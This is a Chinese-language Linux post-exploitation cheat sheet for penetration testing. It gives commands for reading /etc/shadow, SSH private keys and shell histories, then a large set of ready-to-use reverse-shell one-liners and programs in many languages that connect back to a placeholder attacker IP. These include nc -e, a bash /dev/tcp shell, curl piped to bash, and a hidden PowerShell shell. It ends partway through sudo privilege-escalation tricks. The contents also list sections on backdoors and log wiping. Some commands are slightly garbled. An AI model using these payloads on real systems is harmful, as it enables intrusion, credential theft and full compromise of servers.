

# Linux内网安全

* [Linux内网安全](#linux内网安全)
  * [0x01 信息收集](#0x01-信息收集)
    * [操作系统版本](#操作系统版本)
    * [操作系统的内核版本](#操作系统的内核版本)
    * [用户相关](#用户相关)
    * [列主目录](#列主目录)
    * [SSH私钥](#ssh私钥)
    * [审计操作系统环境变量](#审计操作系统环境变量)
    * [当前运行服务权限](#当前运行服务权限)
    * [哪些进程服务具有root权限是否能被利用](#哪些进程服务具有root权限是否能被利用)
    * [安装了哪些应用程序，什么版本](#安装了哪些应用程序什么版本)
    * [service 设置有没有错误的，是否有脆弱处插件](#service-设置有没有错误的是否有脆弱处插件)
    * [主机上有哪些工作计划](#主机上有哪些工作计划)
    * [主机上有哪些纯文本用户密码](#主机上有哪些纯文本用户密码)
    * [系统的对外连接](#系统的对外连接)
    * [其他用户主机与系统的通信](#其他用户主机与系统的通信)
    * [可以找到什么敏感文件](#可以找到什么敏感文件)
    * [相关日志文件](#相关日志文件)
    * [相关网站文件](#相关网站文件)
    * [可写目录](#可写目录)
    * [查看用户做过什么是否存在密码记录php](#查看用户做过什么是否存在密码记录php)
    * [网站上的隐藏配置、文件和数据库信息](#网站上的隐藏配置文件和数据库信息)
    * [查看是否挂在的文件系统](#查看是否挂在的文件系统)
    * [语言支持](#语言支持)
    * [上传方式](#上传方式)
  * [0x02 反弹shell](#0x02-反弹shell)
    * [Awk](#awk)
    * [Bash TCP](#bash-tcp)
    * [C](#c)
    * [Dart](#dart)
    * [Golang](#golang)
    * [Groovy](#groovy)
    * [Java](#java)
    * [Lua](#lua)
    * [Ncat](#ncat)
    * [Netcat OpenBsd(适用于nc没\-e选项)](#netcat-openbsd适用于nc没-e选项)
    * [Netcat BusyBox(适用于nc没\-e选项)](#netcat-busybox适用于nc没-e选项)
    * [Netcat Traditional](#netcat-traditional)
    * [NodeJS](#nodejs)
    * [OpenSSL(流量加密，推荐)](#openssl流量加密推荐)
    * [Perl](#perl)
    * [PHP](#php)
    * [Powershell](#powershell)
    * [Python](#python)
    * [Ruby](#ruby)
    * [Socat](#socat)
    * [Telnet](#telnet)
    * [curl](#curl)
    * [wget](#wget)
  * [0x03 权限提升](#0x03-权限提升)
    * [一、使用 Sudo 权限提升](#一使用-sudo-权限提升)
      * [1、sudoers基本概念](#1sudoers基本概念)
      * [2、sudoers文件语法](#2sudoers文件语法)
      * [3、分配root权限的方法](#3分配root权限的方法)
      * [4、sudo提权技巧](#4sudo提权技巧)
        * [（1）允许二进制命令的Root权限](#1允许二进制命令的root权限)
        * [（2）允许Shell脚本的root权限](#2允许shell脚本的root权限)
        * [（3）允许其他程序的sudo权限](#3允许其他程序的sudo权限)
    * [二、SUID二进制文件提权](#二suid二进制文件提权)
      * [1、SUID权限设置](#1suid权限设置)
      * [2、查找系统SUID文件](#2查找系统suid文件)
      * [3、SUID提权技巧](#3suid提权技巧)
    * [三、Capabilities提权](#三capabilities提权)
      * [capabilities介绍](#capabilities介绍)
      * [Capabilities使用](#capabilities使用)
      * [Capabilities提权技巧](#capabilities提权技巧)
        * [Python提权](#python提权)
        * [Perl提权](#perl提权)
        * [php提权](#php提权)
    * [四、利用LXD实现权限提升](#四利用lxd实现权限提升)
    * [五、利用crontab计划任务提权](#五利用crontab计划任务提权)
    * [六、/etc/passwd文件可写入提权](#六etcpasswd文件可写入提权)
      * [/etc/passwd文件介绍](#etcpasswd文件介绍)
      * [写入用户提权](#写入用户提权)
    * [七、利用PATH变量提权](#七利用path变量提权)
      * [PATH变量介绍](#path变量介绍)
      * [利用PATH提权技巧](#利用path提权技巧)
    * [八、LD\_Preload 权限提升](#八ld_preload-权限提升)
    * [九、Python库劫持权限提升](#九python库劫持权限提升)
    * [十、Docker权限提升](#十docker权限提升)
    * [十一、NFS配置不当导致Linux权限提升](#十一nfs配置不当导致linux权限提升)
    * [十二、利用通配符权限提升](#十二利用通配符权限提升)
    * [十三、利用内核漏洞进行提权](#十三利用内核漏洞进行提权)
  * [0x04 权限维持](#0x04-权限维持)
    * [一、增加超级用户](#一增加超级用户)
    * [二、放置SUID Shell](#二放置suid-shell)
    * [三、ssh 公钥免密](#三ssh-公钥免密)
    * [四、Crontab后门](#四crontab后门)
    * [五、alias 后门](#五alias-后门)
    * [六、SSH软链接后门](#六ssh软链接后门)
    * [七、SSH wrapper后门](#七ssh-wrapper后门)
    * [八、openssh后门](#八openssh后门)
    * [九、PAM后门](#九pam后门)
    * [<strong>十、rookit后门</strong>](#十rookit后门)
    * [十一、利用系统服务程序](#十一利用系统服务程序)
    * [十二、共享库文件](#十二共享库文件)
    * [十四、隐藏文件](#十四隐藏文件)
    * [十五、Git hooks](#十五git-hooks)
    * [十六、PROMPT\_COMMAND后门](#十六prompt_command后门)
    * [十七、PROMPT\_COMMAND提权](#十七prompt_command提权)
    * [十八、Sudoers “trick”](#十八sudoers-trick)
    * [十九、TCP Wrappers](#十九tcp-wrappers)
    * [二十、nmap nse后门](#二十nmap-nse后门)
    * [二十一、进程注入](#二十一进程注入)
  * [0x05 痕迹清除](#0x05-痕迹清除)
    * [一、清除历史命令记录](#一清除历史命令记录)
    * [二、修改上传文件时间戳](#二修改上传文件时间戳)
    * [三、Linux日志修改](#三linux日志修改)
      * [Apache日志修改](#apache日志修改)
      * [MySQL日志文件修改](#mysql日志文件修改)
      * [php日志修改](#php日志修改)
      * [Linux日志](#linux日志)
    * [四、隐藏远程SSH登陆记录](#四隐藏远程ssh登陆记录)

------

## 0x01 信息收集

### 操作系统版本
```php
cat /etc/issue

cat /etc/*-release

cat /etc/lsb-release

cat /etc/redhat/release

getconf LONG_BIT  查看系统位数
```
------

### 操作系统的内核版本
```php
cat /proc/version

uname -a

uname -mrs

rpm -q kernel

dmesg |grep Linux

ls /boot |grep vmlinuz

```
------

### 用户相关
```php
id
who
w
last
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # 列出超级用户
awk -F: '($3 == "0") {print}' /etc/passwd   #列出超级用户
cat /etc/sudoers
sudo -l

```
------

### 列主目录
```php
ls -ahlR /root/
ls -ahlR /home/
其他用户的操作记录
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```
------

### SSH私钥
```php
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```
------

### 审计操作系统环境变量
```php
cat /etc/profile

cat /etc/bashrc

cat ~/.bash_profile

cat ~/.bashrc

cat ~/.bash_logout

env

set
```
------

### 当前运行服务权限
```php
ps aux

ps -ef

top

cat /etc/service

```
------

### 哪些进程服务具有root权限是否能被利用
```php
ps -aux | grep root

ps -ef|grep root
```
------

### 安装了哪些应用程序，什么版本
```php
ls -alh /usr/bin

ls -alh /sbin

dpkg -l

rpm -qa

ls -alh /var/cache/apt/archiveso

ls -alh /var/cache/yum
```
------

### service 设置有没有错误的，是否有脆弱处插件
```php
cat /etc/syslog.conf

cat /etc/chttp.conf

cat /etc/lighttpd.conf

cat /etc/cups/cupsd.conf

cat /etc/inetd.conf

cat /etc/apache2/apache2.conf

cat /etc/my.conf

cat /etc/httpd/conf/httpd.conf

cat /opt/lampp/etc/httpd.conf

ls -aRl /etc/ | wak '$1 ~/^.*r.*/
```
------

### 主机上有哪些工作计划
```php
crontab -l ls -alh /var/spool/cron

ls -al /etc/ |grep cron ls -al /etc/cron*

cat /etc/cron* cat /etc/at.allow

cat /etc/at.deny cat /etc/cron.allow

cat /etc/cron.deny cat /etc/crontab

cat /etc/anacrontab

cat /var/spool/cron/crontabs/root
```
------

### 主机上有哪些纯文本用户密码
```php
grep -i user[filename]

grep -i pass[filename]

grep -C 5 "password"[fileame]

find -name "*.php*" -printo | xargs -o grep -i in "var $password"
```
------

### 系统的对外连接
```php
/sbin/ifconfig -a

cat /etc/network/interfaces

cat /etc/sysconfig/network
```
------

### 其他用户主机与系统的通信
```php
lsof -l 

lsof -i:80

cat /etc/services 

netstat -antup

netstat -antpx 

netstat -tulpn

chkconfig -list 

chkconfig --list | grep 3:on

Last 缓存，IP和mac地址

Arp -a Route

/sbin/route -nee
```
------

### 可以找到什么敏感文件
```php
cat /etc/passwd 

cat /etc/group

cat /etc/shadow 

ls -alh /var/mail/
```
------

### 相关日志文件
```php
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```
------

### 相关网站文件
```php
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```
------

### 可写目录
```php
find / -writable -type d 2>/dev/null      # 可写目录
find / -perm -222 -type d 2>/dev/null     # 可写目录 
find / -perm -o w -type d 2>/dev/null     # 可写目录
find / -perm -o x -type d 2>/dev/null     # 可执行目录
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # 可写可执行目录
```
------

### 查看用户做过什么是否存在密码记录php
```php
cat ~/.bash_history 

cat ~/.nano_history

cat ~/.atftp_history 

cat ~/.mysql_history

cat ~/.php_history
```
------

### 网站上的隐藏配置、文件和数据库信息
```php
ls -alhR /var/www/

ls -alhR /src/www/htdocs/

ls -alhR /usr/local/www/apache22/data/

ls -alhR /opt/lampp/htdocs/

ls -alhR /var/www/html/
```
------

### 查看是否挂在的文件系统
```php
mount

df -h

cat /etc/fstab
```
------

### 语言支持
```php
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
```
------

### 上传方式
```php
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```


------

## 0x02 反弹shell

在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个 shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行 shell 连接，这种情况下该怎么获取 shell 呢？
而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹 shell 来获取连接，即通过服务器反向连接一个外部机器来获取一个 shell。
反弹 shell 通常是外网渗透的最后一步，也是内网渗透的第一步。

------

### Awk
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
awk 'BEGIN {s = "/inet/tcp/0/攻击机IP/9999"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
------

### Bash TCP
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
bash -i >& /dev/tcp/攻击机IP/9999 0>&1
或
0<&196;exec 196<>/dev/tcp/攻击机IP/9999; sh <&196 >&196 2>&196
或
/bin/bash -l > /dev/tcp/攻击机IP/9999 0<&1 2>&1
```
------

### C
攻击机：
```php
nc -lvp 9999
```
目标主机：
Compile with gcc /tmp/shell.c --output csh && csh
```php
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 9999;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("攻击机IP");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}

```
------

### Dart
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("攻击者IP", 9999).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}

```
------

### Golang
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","攻击机IP地址:9999");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

```
------

### Groovy
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
String host="攻击机IP";
int port=9999;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
------

### Java
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/攻击机IP/9999;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();

```
------

### Lua
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
lua5.1 -e 'local host, port = "攻击者IP", 9999 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

```
------

### Ncat
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
ncat 攻击机IP 9999 -e /bin/bash
```
------

### Netcat OpenBsd(适用于nc没-e选项)
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 攻击者IP 9999 >/tmp/f
```
------

### Netcat BusyBox(适用于nc没-e选项)
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 攻击者IP 9999 >/tmp/f
```
------

### Netcat Traditional
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
nc -e /bin/bash 攻击者IP 9999
```
------

### NodeJS
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9999, "攻击者IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py

```
------

### OpenSSL(流量加密，推荐)
攻击机：
```php
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 9999
```
目标主机：
```php
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 攻击者IP:9999 > /tmp/s; rm /tmp/s
```
------

### Perl
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
perl -e 'use Socket;$i="攻击者IP";$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```
------

### PHP


攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
php -r '$sock=fsockopen("攻击者IP",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
or
'$sock=fsockopen("攻击者IP",9999);system("/bin/sh -i <&3 >&3 2>&3");'
```
------

### Powershell
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("攻击者IP",9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```
------

### Python
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
export RHOST="攻击者IP";export RPORT=9999;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

```
------

### Ruby
攻击机：
```php
nc -lvp 9999
```
目标主机：
```php
ruby -rsocket -e'f=TCPSocket.open("攻击者",9999).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
------

### Socat
攻击机：
```php
socat file:`tty`,raw,echo=0 TCP-L:9999
```
目标主机：
```php
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:攻击者IP:9999
```
------

### Telnet
攻击机：
```php
nc -lvp 8080
nc -lvp 8081
```
目标主机：
```php
telnet 攻击者IP 8080 | /bin/sh | telnet 攻击者IP 8081
```
------

### curl
攻击者：
```php
echo "bash -i >& /dev/tcp/攻击机IP/9999 0>&1" > shell.txt
python3 -m http.server 8080
nc -lvp 9999
```
目标主机：
```php
curl http://攻击机IP:8080/shell.txt | bash
```
------

### wget 
攻击者：
```php
echo "bash -i >& /dev/tcp/攻击机IP/9999 0>&1" > shell.txt
python3 -m http.server 8080
nc -lvp 9999
```

------


## 0x03 权限提升
### 一、使用 Sudo 权限提升

#### 1、sudoers基本概念

在Linux/Unix中，/etc目录下的sudoers文件是sudo权限的配置文件。我们都知道sudo命令的强大功能，sudo这个词代表了超级用户权限。Sudoers文件是存储具有root权限的用户和组的文件，以root或其他用户身份运行部分或全部命令。请看下图：
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635851616986-719b53f2-d4cf-48a1-bfe1-4e054f13d178.png#clientId=uaa5b3761-0b84-4&from=paste&height=371&id=u0906b5ec&margin=%5Bobject%20Object%5D&name=image.png&originHeight=742&originWidth=1261&originalType=binary&ratio=1&size=76752&status=done&style=none&taskId=u01cc670b-9054-46dc-aedc-a58bdc39fd2&width=630.5)
当与sudo一起运行任何命令时，它需要root权限才能执行，Linux会检查sudoers文件中的特定用户名。并给出结论，特定的用户名是否在sudoers文件列表中，如果没有，那么就不能使用sudo命令运行命令或程序。根据sudo权限，root用户可以从ALL终端执行，充当所有用户：all group，并运行ALL命令。

#### 2、sudoers文件语法

如果(root用户)希望授予任何特定用户sudo权限，请输入**visudo**命令，该命令将打开sudoers文件进行编辑。在用户权限规范下，您将看到默认的root权限“**root ALL =（ALL：ALL）ALL**”，但在实际情况下，还提供了标记选项，这是可选的，如下图所示
考虑下面的示例，我们要为用户Raaz分配sudo权限，Raaz访问终端并使用root权限运行copy命令。这里没有设置密码，这意味着使用sudo执行执行这个命令无需密码。
**注意：**

- （ALL：ALL）也可以表示为（ALL）
- 如果您找到（root）代替（ALL：ALL），则表示用户可以以root身份运行该命令
- 如果没有提及用户或组，则表示sudo默认为root用户

![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635851919100-3caf16cf-840f-4b91-acb3-abdccb993f02.png#clientId=uaa5b3761-0b84-4&from=paste&height=209&id=u7268488b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=417&originWidth=1246&originalType=binary&ratio=1&size=190423&status=done&style=none&taskId=u1ba8be5a-e7e5-49a6-be7e-f2f7192adde&width=623)​

#### 3、分配root权限的方法

如果系统管理员希望授予用户test所有权限，那么他可以按照以下步骤在用户权限规范类别下添加用户test。
```php
visudo
test ALL=(ALL:ALL) ALL
orphp
test ALL=(ALL) ALL
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635852116785-85392f62-b996-4c00-9cd1-1e66521a12ec.png#clientId=uaa5b3761-0b84-4&from=paste&height=391&id=u704a5490&margin=%5Bobject%20Object%5D&name=image.png&originHeight=781&originWidth=1641&originalType=binary&ratio=1&size=73742&status=done&style=none&taskId=ucf94f474-ea2f-4814-a409-ca9acbe8ad1&width=820.5)
切换到test用户上，输入sudo -l命令查看sudo权限
```php
sudo -l
```
这里可以看到用户test可以以root用户身份运行所有命令
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635852712445-58fd42a4-9194-42a7-ab3f-963f67a43e83.png#clientId=uaa5b3761-0b84-4&from=paste&height=237&id=u631c8639&margin=%5Bobject%20Object%5D&name=image.png&originHeight=473&originWidth=1561&originalType=binary&ratio=1&size=44753&status=done&style=none&taskId=ue91c0285-65c0-498c-8183-bf2b6c526bb&width=780.5)
#### 4、sudo提权技巧
------

##### （1）允许二进制命令的Root权限

有时用户有权执行特定目录的任何文件或命令，如/bin/cp、/bin/cat或/usr/bin/find，这种类型的权限会导致root权限的权限提升，可以通过以下步骤来实现。
```php
test ALL=(root) NOPASSWD: /usr/bin/find
```
**注意：**此处NOPASSWD选项表示在运行sudo -l命令时将不会为身份验证请求密码。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635853718491-791459d4-47a5-4c07-876c-c3d0953814e9.png#clientId=uaa5b3761-0b84-4&from=paste&height=396&id=u26d176b6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=791&originWidth=1427&originalType=binary&ratio=1&size=74833&status=done&style=none&taskId=u9e8c5c65-65e4-4ce2-ab21-4519aa184f2&width=713.5)
在权限提升阶段，执行以下命令查看sudo权限。
```php
sudo -l
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635853828375-bc8995da-3aee-4d1a-bf25-09a9c06c4496.png#clientId=uaa5b3761-0b84-4&from=paste&height=231&id=uea3b2b07&margin=%5Bobject%20Object%5D&name=image.png&originHeight=461&originWidth=1317&originalType=binary&ratio=1&size=38470&status=done&style=none&taskId=u6bc592f7-bea6-49fa-a1b0-584b39d257d&width=658.5)
使用find命令提权到root用户权限

```php
sudo find . -exec /bin/bash -p \;
```
从下图可以看到，已经成功提权到root用户权限了
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635853923710-4127291d-7941-419e-a35b-3aca4a42fbe1.png#clientId=uaa5b3761-0b84-4&from=paste&height=172&id=u9b6fcecc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=343&originWidth=1811&originalType=binary&ratio=1&size=38283&status=done&style=none&taskId=u4b5cfc5d-d649-4a2f-8f8b-fcf9a69521a&width=905.5)
除了find命令，还有以下命令可以提权到root用户权限
Linux提权：[https://gtfobins.github.io/#+sudo](https://gtfobins.github.io/#+sudo)
```php
##apt
sudo apt changelog apt
!/bin/sh

##awk
sudo awk 'BEGIN {system("/bin/sh")}'

##bash
sudo bash

##gcc
sudo gcc -wrapper /bin/sh,-s .

##git
sudo git -p help config
!/bin/sh

##less
sudo less /etc/profile
!/bin/sh

##mail
sudo mail --exec='!/bin/sh'

##more
sudo more /etc/profile
!/bin/sh

##mount
sudo mount -o bind /bin/sh /bin/mount
sudo mount

##nmap
sudo nmap --interactive
nmap> !sh

##npm
sudo npm exec /bin/sh

##php
sudo php -r "system('$CMD');"

##python
sudo python -c 'import os; os.system("/bin/sh")'

##vim
sudo vim -c ':!/bin/sh'
```
##### （2）允许Shell脚本的root权限
 对于系统或程序调用，有最大的机会获得任何类型的脚本的权限提升，它可以是任何脚本（bash、php、python或c语言脚本）。假设您（系统管理员）想要对任何将在执行时提供bash shell的脚本赋予sudo权限。
例如，我们有一些脚本将在执行时提供root命令终端，在下图中，您可以看到我们已经编写了3个程序，通过使用不同的编程语言来获取bash shell，并将所有三个文件都保存在bin/script中，该三个文件为：asroot.py、asroot.sh、asroot.c（编译文件shell）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635854947035-7427e453-b132-4603-aa12-50523aed460c.png#clientId=uaa5b3761-0b84-4&from=paste&height=475&id=u62484bd3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=950&originWidth=1840&originalType=binary&ratio=1&size=102004&status=done&style=none&taskId=u95915e1d-7a8a-46c0-ba1c-780d8cfcf30&width=920)
现在允许test以root用户身份运行以上所有脚本，方法是在以下命令的帮助下编辑sudoers文件。
```php
test ALL= (root) NOPASSWD: /bin/script/asroot.sh, /bin/script/asroot.py, /bin/script/shell
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635859087444-8999e356-a40f-4d73-93b0-ecda3e68b07e.png#clientId=uaa5b3761-0b84-4&from=paste&height=426&id=u613f10d6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=852&originWidth=1605&originalType=binary&ratio=1&size=96753&status=done&style=none&taskId=u84c5e4e8-a6e7-44b1-bb59-48a6a573699&width=802.5)
在权限提升阶段，执行以下命令查看sudo权限。
```php
sudo -l 
```
根据结果返回可以看到test用户允许用root权限执行asroot.py、asroot.sh、asroot.c三个文件
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635859238482-a2aa9ba5-b941-4055-becb-f08e24042f12.png#clientId=uaa5b3761-0b84-4&from=paste&height=276&id=u1180469a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=552&originWidth=1527&originalType=binary&ratio=1&size=48796&status=done&style=none&taskId=uc9f26d9b-99e3-4306-bbf7-2cdcc613aa4&width=763.5)
分别执行asroot.py、asroot.sh、asroot.c三个文件获取root权限
```php
sudo /bin/script/asroot.sh
sudo /bin/script/asroot.py
sudo /bin/script/shell
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635859349690-2faa26e4-0141-4cce-aa09-5605fb932720.png#clientId=uaa5b3761-0b84-4&from=paste&height=281&id=ub472c96b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=562&originWidth=1800&originalType=binary&ratio=1&size=51241&status=done&style=none&taskId=uae36c551-0114-4a01-be84-d588a00fead&width=900)
**​**

##### （3）允许其他程序的sudo权限
正如上面所看到的那样，一些具有sudo权限的二进制程序有助于获得root访问权限。但除此之外，还有一些应用程序可以活得root访问权限，如果拥有sudo权限，如FTP或socat。在下面给出的命令中，我们为以下程序分配了sudo权限，该程序可以以root用户身份运行。
```php
test ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635857270778-24322362-82d7-4878-b59a-2741ed0cdc10.png#clientId=uaa5b3761-0b84-4&from=paste&height=419&id=u12f85638&margin=%5Bobject%20Object%5D&name=image.png&originHeight=837&originWidth=1672&originalType=binary&ratio=1&size=82875&status=done&style=none&taskId=ucd5b6b13-bb70-43b9-b736-9a830b8d219&width=836)
在权限提升阶段，执行以下命令查看sudo权限。
```php
sudo -l
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635857317420-b0f5e2b5-344f-4f66-ab57-7a783bba7e29.png#clientId=uaa5b3761-0b84-4&from=paste&height=260&id=u25e0bc7c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=520&originWidth=1410&originalType=binary&ratio=1&size=51810&status=done&style=none&taskId=u5b878abc-f442-498f-bd87-b0f4112fefa&width=705)
**（1）使用env环境变量命令提权到root**

```php
sudo env /bin/bash
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635857359427-b38377e5-d008-4723-a610-7f71ff1c057f.png#clientId=uaa5b3761-0b84-4&from=paste&height=202&id=ub74d418c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=403&originWidth=1651&originalType=binary&ratio=1&size=39652&status=done&style=none&taskId=ue1e3a427-2a28-408e-bf43-bb664e1e941&width=825.5)
**（2）使用ftp命令提权到root**
```php
sudo ftp
! /bin/bash
whoami
or
! /bin/sh
id
whoami
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635857440890-9036ce20-3155-485d-b67f-a36dbb866e45.png#clientId=uaa5b3761-0b84-4&from=paste&height=189&id=ub404952e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=378&originWidth=1405&originalType=binary&ratio=1&size=32153&status=done&style=none&taskId=uc0e9e463-64a1-4e36-81e2-7b05baaffbb&width=702.5)
**（3）使用Socat命令提权到root权限的Shell**
在攻击者机器上执行以下命令进行监听
```php
socat file:`tty`,raw,echo=0 tcp-listen:1234
```
